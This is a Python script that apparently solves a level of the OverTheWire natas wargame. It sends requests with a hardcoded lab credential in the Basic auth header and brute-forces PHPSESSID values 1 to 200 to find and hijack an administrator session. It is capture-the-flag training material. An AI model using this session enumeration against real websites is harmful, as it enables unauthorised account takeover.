#! /usr/bin/python3

import string
import sys
import time
import urllib.parse
import urllib.request


def main():
    url = 'http://natas18.natas.labs.overthewire.org/'
    headers = {
        'Authorization': 'Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg=='
    }

    for i in range(200):
        print(f'Trying PHPSESSSID {i + 1}')

        headers['Cookie'] = f'PHPSESSID={i + 1}'
        req = urllib.request.Request(url, headers=headers)
        resp = urllib.request.urlopen(req)

        resp_body = resp.read().decode()
        if not "You are logged in as a regular user." in resp_body:
            print(resp_body)


if __name__ == "__main__":
    main()
